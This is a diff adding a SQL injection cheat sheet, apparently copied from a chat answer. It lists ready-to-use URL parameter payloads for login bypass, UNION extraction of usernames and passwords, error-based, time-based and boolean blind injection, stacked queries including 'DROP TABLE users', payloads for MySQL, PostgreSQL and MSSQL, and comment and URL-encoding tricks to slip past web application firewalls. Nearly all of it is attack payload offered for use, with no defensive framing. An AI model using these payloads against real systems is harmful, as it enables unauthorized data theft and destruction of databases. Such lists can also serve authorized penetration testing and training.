@@ -1,0 +1,79 @@
+🧪 Basic Payloads
+1. Bypass Login or Filters
+
+bash
+Copy
+Edit
+?id=1 OR 1=1
+?id=1' OR '1'='1
+?id=1' --
+?id=1' OR 1=1 -- -
+2. Union-based Injection
+
+pgsql
+Copy
+Edit
+?id=1 UNION SELECT NULL, NULL
+?id=1 UNION SELECT 1, 'username', 'password' FROM users
+?id=-1 UNION SELECT null, version(), user() -- 
+3. Error-based (to leak info)
+
+pgsql
+Copy
+Edit
+?id=1' AND 1=CONVERT(int, (SELECT @@version))-- 
+?id=1' AND extractvalue(1, concat(0x7e, (SELECT user())))-- 
+4. Time-based Blind SQLi
+
+bash
+Copy
+Edit
+?id=1' AND SLEEP(5) -- 
+?id=1 AND IF(1=1, SLEEP(5), 0) -- 
+🧪 Boolean-based Blind SQLi
+Used to infer true/false responses:
+
+bash
+Copy
+Edit
+?id=1 AND 1=1 -- true
+?id=1 AND 1=2 -- false
+🧪 Stacked Queries (if supported)
+Only works on some DBs and only if multiple queries are allowed:
+
+sql
+Copy
+Edit
+?id=1; DROP TABLE users --
+?id=1; SELECT * FROM users --
+💉 DB-Specific Payloads
+MySQL
+
+pgsql
+Copy
+Edit
+?id=1' AND (SELECT COUNT(*) FROM users) > 0 --
+?id=1' AND ASCII(SUBSTRING((SELECT database()),1,1))=115 -- 
+PostgreSQL
+
+pgsql
+Copy
+Edit
+?id=1; SELECT pg_sleep(5)--
+?id=1' UNION SELECT NULL, version() -- 
+MSSQL
+
+bash
+Copy
+Edit
+?id=1; WAITFOR DELAY '00:00:05' --
+?id=1' OR 1=1;-- 
+🔐 Bypassing Basic WAFs
+Some filters may block OR, UNION, etc. Try obfuscation:
+
+perl
+Copy
+Edit
+?id=1/**/OR/**/1=1
+?id=1'/*!50000UNION*/SELECT-- 
+?id=1%27%20OR%20%271%27=%271
